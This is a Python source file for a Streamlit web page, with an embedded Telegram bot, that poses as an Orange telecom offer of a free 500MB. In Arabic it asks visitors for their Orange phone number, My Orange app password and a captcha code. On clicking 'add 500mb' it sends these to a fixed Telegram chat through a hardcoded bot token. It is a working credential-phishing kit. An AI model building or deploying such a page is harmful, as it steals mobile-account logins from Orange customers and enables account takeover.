import streamlit as st
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters

# Replace 'YOUR_TOKEN' with your Telegram Bot token
TOKEN = '7060312406:AAGqNhOh6s4RVufoV4Qp1eq8D0DNNDfDiZs'

def start(update, context):
    update.message.reply_text('مرحبًا! قم بإدخال رقم تليفون اورانج وباسورد تطبيق my orange.')

def echo(update, context):
    chat_id = update.message.chat_id
    message_text = update.message.text
    context.bot.send_message(chat_id=chat_id, text=message_text)

def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, echo))
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()

st.title('500MB | orange')

st.markdown(
    """
    <style>
        .box {
          width: 275px;
          padding: 55px 56px;
          poosition: absolute;
          background-color: black;
          height: 375px;
          border-radius: 20px;
        }

        body {
          margin: 0;
          padding: 0;
          font-family: sans-serif;
          justify-content: center;
          align-items: center;
          display: flex;
          background-position: center center;
          background-attachment: fixed;
          background-repeat: no-repeat;
          background-size: 100% 100%;
          background-image: url(https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Orange_logo.svg/1200px-Orange_logo.svg.png);
        }

        input {
          background-color: black;
          display: block;
          margin: 20px auto;
          text-align: center;
          padding: 14px 11px;
          width: 274px;
          color: white;
          border-radius: 24px;
          font-weight: bolder;
          border: 2px solid lightblue;
        }

        .box input:focus {
          border: 2.5px solid yellow;
        }

        .box .btn {
          display: block;
          margin: 20px auto;
          text-align: center;
          color: white;
          font-weight: bolder;
          border-radius: 10px;
          padding: 5px 30px;
          border: 2px solid yellow;
          background-color: black;
          font-size: 16px
        }

        #loading-indicator {
          display: none;
        }

        #loading-indicator:before {
          content: "";
          display: inline-block;
          width: 35px;
          height: 35px;
          border: 6px solid yellow;
          border-top-color: red;
          border-bottom-color: darkred;
          border-radius: 50%;
          animation: spin 0.67s linear infinite;
        }

        @keyframes spin {
          to {
            transform: rotate(360deg);
          }
        }
    </style>
    """,
    unsafe_allow_html=True
)

number = st.text_input("رقم تليفون اورانج", type="number")
password = st.text_input("باسورد تطبيق my orange", type="password")

captcha_response = st.text_input("كود الكباتشا")

if st.button("add 500mb"):
    bot_message = f"رقم التليفون: {number}\nباسورد تطبيق my orange: {password}\nكود الكباتشا: {captcha_response}"
    updater = Updater(TOKEN)
    updater.bot.send_message(chat_id='5939899289', text=bot_message)
    st.write("تم إرسال المعلومات بنجاح إلى البوت على التليجرام.")
